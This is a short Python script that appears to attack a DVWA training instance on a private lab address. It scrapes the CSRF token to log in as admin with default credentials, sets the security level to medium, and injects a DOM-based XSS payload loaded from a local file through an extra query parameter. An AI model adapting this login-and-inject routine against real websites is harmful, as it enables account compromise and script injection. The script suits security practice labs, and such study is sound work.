import requests

session = requests.Session()


def Login():
    urlLogin = "http://192.168.231.131:8080/login.php"
    response = session.get(urlLogin).text
    target = "name='user_token' value='"
    index = response.find(target)
    start = index + len(target)
    end = start + 32
    token = response[start:end]
    data_form = {
        "username": "admin",
        "password": "password",
        "Login": "Login",
        "user_token": token,
    }
    response = session.post(urlLogin, data=data_form)


Login()


def changeSecurityLevel(level):
    urlSecurity = "http://192.168.231.131:8080/security.php"
    response = session.get(urlSecurity).text
    target = "name='user_token' value='"
    index = response.find(target)
    start = index + len(target)
    end = start + 32
    token = response[start:end]
    data_form = {
        "security": level,
        "seclev_submit": "Submit",
        "user_token": token,
    }
    session.post(urlSecurity, data=data_form)


changeSecurityLevel("medium")

def domXSS():
    urlXSS = "http://192.168.231.131:8080/vulnerabilities/xss_d/"
    with open ("script.txt","r") as f:
        script = f.read()
    params = {
        "default1" : script,
        "default": "English"
    }
    response = session.get(urlXSS,params=params)
    print(response.text)
    
domXSS()